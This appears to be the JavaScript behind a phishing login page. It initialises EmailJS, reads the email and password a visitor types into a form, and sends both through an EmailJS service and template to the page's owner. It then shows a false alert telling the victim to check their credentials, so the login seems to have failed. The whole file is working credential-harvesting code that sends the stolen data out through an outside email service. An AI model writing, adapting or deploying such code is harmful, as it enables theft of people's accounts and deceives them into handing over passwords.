(function () {
  emailjs.init("1m6dN0gm7NpV9CaTE");
})();

function dergo() {
  const params = {
    email: document.getElementById("email").value,
    password: document.getElementById("password").value
  };

  emailjs
    .send("service_cb5unuk", "template_r29d4im", params)
    .then(() => {
      alert("please check your email and password!");
    })
    .catch(() => {
      alert("something went wrong!");
    });
}